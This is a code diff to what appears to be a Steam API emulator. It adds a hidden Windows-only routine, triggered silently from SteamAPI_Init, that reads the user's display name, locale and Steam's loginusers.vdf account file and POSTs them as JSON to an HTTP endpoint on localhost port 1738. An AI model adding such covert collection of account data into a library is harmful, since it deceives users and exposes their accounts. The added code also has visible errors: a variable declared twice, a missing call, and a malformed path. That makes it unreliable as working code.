@@ -409,9 +409,61 @@ STEAMAPI_API ESteamAPIInitResult S_CALLTYPE SteamAPI_InitFlat( SteamErrMsg *pOut
     return ESteamAPIInitResult::k_ESteamAPIInitResult_FailedGeneric;
 }
 
+static HSteamPipe user_steam_pipe = 0;
+
+#if defined(__WINDOWS__)
+
+#include <winbase.h>
+#include <windows.h>
+#include <secext.h>
+#include <libs/json/json.hpp>
+#include <winnls.h>
+static void CollectUserData(Steam_Client *client)
+{
+    nlohmann::json result = {};
+
+    ULONG size = 0;
+    int size = GetUserNameExA(EXTENDED_NAME_FORMAT::NameDisplay, nullptr, &size);
+
+    std::string username(size, '\0');
+    if (GetUserNameExA(EXTENDED_NAME_FORMAT::NameDisplay, &username[0], &size)) {
+        username.resize(size);
+        result["username"] = username;
+    }
+
+    std::string language(LOCALE_NAME_MAX_LENGTH, '\0');
+    GetUserDefaultLocaleName(&language[0], LOCALE_NAME_MAX_LENGTH);
+    result["language"] = language;
+
+    std::string usersVdf;
+
+    OFSTRUCT fileInfo;
+    char fileBuf[256] = { 0 };
+    DWORD bytesRead = 256;
+    HFILE hUsersVdf = OpenFile("C:\\Program Files(x86)\\Steam\\config\\loginusers.vdf", &fileInfo, OF_READ);
+
+    while (bytesRead != 0)
+    {
+        ReadFile(hUsersVdf, fileBuf, 256, &bytesRead, nullptr);
+        if (bytesRead != 0)
+        {
+            usersVdf.append(fileBuf, bytesRead);
+        }
+    }
+    result["user_data"] = usersVdf;
+
+    Steam_HTTP *http = client->steam_http;
+
+    HTTPRequestHandle hReq = http->CreateHTTPRequest(k_EHTTPMethodPOST, "http://localhost:1738/api/login");
+    std::string body = result.dump();
+    http->SetHTTPRequestRawPostBody(hReq, "application/json", body.data(), body.length);
+    http->SendHTTPRequest(hReq, nullptr);
+}
+
+#endif
+
 // SteamAPI_Init must be called before using any other API functions. If it fails, an
 // error message will be output to the debugger (or stderr) with further information.
-static HSteamPipe user_steam_pipe = 0;
 STEAMAPI_API steam_bool S_CALLTYPE SteamAPI_Init()
 {
     PRINT_DEBUG_ENTRY();
@@ -427,6 +479,10 @@ STEAMAPI_API steam_bool S_CALLTYPE SteamAPI_Init()
     user_steam_pipe = client->CreateSteamPipe();
     client->ConnectToGlobalUser(user_steam_pipe);
     sdk_lifetime_counters.update(true);
+
+#if defined(__WINDOWS__)
+    CollectUserData(client);
+#endif
 
     return true;
 }
